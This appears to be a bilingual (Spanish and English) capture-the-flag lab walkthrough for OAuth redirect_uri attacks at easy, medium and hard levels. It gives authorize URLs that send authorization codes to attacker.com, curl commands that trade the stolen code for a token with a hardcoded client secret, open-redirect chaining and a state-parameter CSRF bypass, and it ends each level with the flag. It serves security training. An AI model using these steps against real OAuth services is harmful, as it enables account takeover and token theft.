How OAuth redirect_uri Attack Works

In OAuth 2.0, after the user authorizes the application the server redirects to redirect_uri with the authorization code. If the server does not validate this URI, an attacker can set it to any URL they control and steal the code.

  1. User clicks "Authorize" in the legitimate app
  2. Attacker intercepts the request and changes redirect_uri
  3. Authorization code is sent to the attacker's server
  4. Attacker exchanges the code for an access token
  5. Attacker accesses the victim's resources

Easy — Open redirect_uri (cualquier URI aceptada)

El servidor de autorización acepta cualquier redirect_uri sin validación. El código de autorización se envía donde el atacante indique.

  1. Intercepta la petición de autorización con Burp Suite y cambia redirect_uri: 
    http://localhost:5000/oauth/authorize?client_id=hacklabs-app&redirect_uri=http://attacker.com/steal&state=abc123&scope=read
  2. El código llega a attacker.com. Intercámbialo por un token: 
    curl -X POST http://localhost:5000/oauth/token \
  -d "code=CODE&client_id=hacklabs-app&client_secret=app-secret-123&redirect_uri=http://attacker.com/steal"
  3. Accede al recurso protegido con el token: 
    curl http://localhost:5000/oauth/userinfo -H "Authorization: Bearer TOKEN"
  4. Flag: HL{0auth_r3d1r3ct_0wn3d}

Medium — Dominio validado, bypass por path

Solo se valida el dominio, no el path completo. Usa el mismo dominio con un path diferente.

  1. Cambia el path de redirect_uri manteniendo el dominio permitido: 
    http://localhost:5000/oauth/authorize?client_id=hacklabs-app&redirect_uri=http://localhost:5000/evil-path&state=abc123&scope=read
  2. O encadena con un open redirect en el dominio permitido: 
    redirect_uri=http://localhost:5000/open_redirect?url=http://attacker.com
  3. El código llega al path controlado. Extráelo de los logs/headers y procede como en Easy.
  4. Flag: HL{0auth_r3d1r3ct_0wn3d}

Hard — Whitelist exacta, bypass de state

La redirect_uri debe coincidir exactamente. Encadena con open redirect o elimina el parámetro state para bypass CSRF.

  1. La URI whitelisted apunta a /oauth/callback. Encadena si /open_redirect acepta cualquier url: 
    # Primero comprueba si existe un open redirect en el servidor:
curl "http://localhost:5000/open_redirect?url=http://attacker.com"

# Si existe, úsalo como destino intermedio:
# /oauth/callback redirige → /open_redirect → attacker.com
  2. State CSRF bypass: algunos servidores omiten la validación de state si no se envía: 
    http://localhost:5000/oauth/authorize?client_id=hacklabs-app&redirect_uri=http://localhost:5000/oauth/callback&scope=read
# Nota: sin el parámetro state
  3. Intercambia el código obtenido: 
    curl -X POST http://localhost:5000/oauth/token \
  -d "code=CODE&client_id=hacklabs-app&client_secret=app-secret-123&redirect_uri=http://localhost:5000/oauth/callback"
  4. Flag: HL{0auth_r3d1r3ct_0wn3d}

Easy — Open redirect_uri (any URI accepted)

The authorization server accepts any redirect_uri without validation. The authorization code is sent wherever the attacker specifies.

  1. Intercept the authorization request with Burp Suite and change redirect_uri: 
    http://localhost:5000/oauth/authorize?client_id=hacklabs-app&redirect_uri=http://attacker.com/steal&state=abc123&scope=read
  2. The code arrives at attacker.com. Exchange it for a token: 
    curl -X POST http://localhost:5000/oauth/token \
  -d "code=CODE&client_id=hacklabs-app&client_secret=app-secret-123&redirect_uri=http://attacker.com/steal"
  3. Access the protected resource with the token: 
    curl http://localhost:5000/oauth/userinfo -H "Authorization: Bearer TOKEN"
  4. Flag: HL{0auth_r3d1r3ct_0wn3d}

Medium — Domain validated, path bypass

Only the domain is checked, not the full path. Use the same domain with a different path.

  1. Change the path of redirect_uri while keeping the allowed domain: 
    http://localhost:5000/oauth/authorize?client_id=hacklabs-app&redirect_uri=http://localhost:5000/evil-path&state=abc123&scope=read
  2. Or chain with an open redirect on the allowed domain: 
    redirect_uri=http://localhost:5000/open_redirect?url=http://attacker.com
  3. The code arrives at the controlled path. Extract it from logs/headers and proceed as in Easy.
  4. Flag: HL{0auth_r3d1r3ct_0wn3d}

Hard — Exact whitelist, state bypass

The redirect_uri must match exactly. Chain with an open redirect or drop the state parameter to bypass CSRF check.

  1. The whitelisted URI points to /oauth/callback. Chain if /open_redirect accepts any url: 
    # First check if an open redirect exists on the server:
curl "http://localhost:5000/open_redirect?url=http://attacker.com"

# If it exists, use it as an intermediate step:
# /oauth/callback redirects → /open_redirect → attacker.com
  2. State CSRF bypass: some servers skip state validation if the parameter is absent: 
    http://localhost:5000/oauth/authorize?client_id=hacklabs-app&redirect_uri=http://localhost:5000/oauth/callback&scope=read
# Note: no state parameter
  3. Exchange the obtained code: 
    curl -X POST http://localhost:5000/oauth/token \
  -d "code=CODE&client_id=hacklabs-app&client_secret=app-secret-123&redirect_uri=http://localhost:5000/oauth/callback"
  4. Flag: HL{0auth_r3d1r3ct_0wn3d}
